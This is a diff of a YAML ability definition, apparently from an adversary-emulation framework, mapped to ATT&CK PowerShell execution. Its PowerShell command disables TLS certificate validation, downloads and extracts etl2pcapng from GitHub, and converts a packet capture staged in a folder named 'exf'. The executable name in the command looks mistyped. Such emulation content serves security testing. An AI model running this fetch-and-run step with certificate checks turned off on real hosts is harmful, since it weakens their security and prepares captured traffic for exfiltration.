@@ -1,17 +1,30 @@
-- name: Download extract etl2pcapng to convert packet capture
+- privilege: ''
+  plugin: ''
+  delete_payload: true
+  technique_id: T1059.001
+  additional_info:
+    cleanup: '[]'
+  technique_name: 'Command and Scripting Interpreter: PowerShell'
+  repeatable: false
+  tactic: execution
+  requirements: []
   description: Downloads extract latest package of etl2pcapng to convert etl capture
     to PCAPNG file
-  tactic: execution
-  technique_id: T1059.001
-  technique_name: 'Command and Scripting Interpreter: PowerShell'
   executors:
-  - payloads: []
-    platform: windows
-    name: psh
+  - platform: windows
     cleanup: []
+    variations: []
+    timeout: 60
+    additional_info: {}
+    name: psh
+    payloads: []
+    language: null
+    uploads: []
     parsers: []
-    command: "$Etl_capture_file=$env:PUBLIC\\exf\\capture.etl\n$exf_file=$env:PUBLIC\\\
-      capture.log\nif ([System.IO.File]::Exists($Etl_capture_file)) {\n\t[System.Net.ServicePointManager]::ServerCertificateValidationCallback=\
+    code: null
+    build_target: null
+    command: "$Etl_capture_file=$env:PUBLIC\\exf\\capture.etl;\n$exf_file=$env:PUBLIC\\\
+      capture.log;\nif ([System.IO.File]::Exists($Etl_capture_file)) {\n\t[System.Net.ServicePointManager]::ServerCertificateValidationCallback=\
       \ { $True };\n\t$web = (New-Object System.Net.WebClient);\n\t$result = $web.DownloadFile(\"\
       https://github.com/microsoft/etl2pcapng/releases/latest/download/etl2pcapng.zip\"\
       ,\"etl2pcapng.zip\");\n      \tNew-Item -ItemType \"directory\" $env:PUBLIC\\\
@@ -20,15 +33,10 @@
       \ \n\t[System.IO.Compression.ZipFile]::ExtractToDirectory(\"$env:PUBLIC\\etl2pcapng\\\
       etl2pcapng.zip\",\"$env:PUBLIC\\etl2pcapng\");'\n        $env:PUBLIC\\etl2pcapng\\\
       etl2pcapng\\x86\\etl2etlpcapng.exe $env:PUBLIC\\exf\\capture.etl $env:PUBLIC\\\
-      exf\\capture.pcap  \n\texit 0;\n} else {\n  echo \"ETL file $Etl_capture_file\
+      exf\\capture.pcap;  \n\texit 0;\n} else {\n  echo \"ETL file $Etl_capture_file\
       \ Failed does not exists.\" >$exf_file;\n  exit 1;\n};"
-    timeout: '60'
-  repeatable: false
-  additional_info: {}
-  privilege: ''
   singleton: false
   buckets: []
-  requirements: []
+  name: Download extract etl2pcapng to convert packet capture
   access: {}
-  cleanup: []
   id: etl2pcap_download_and_use
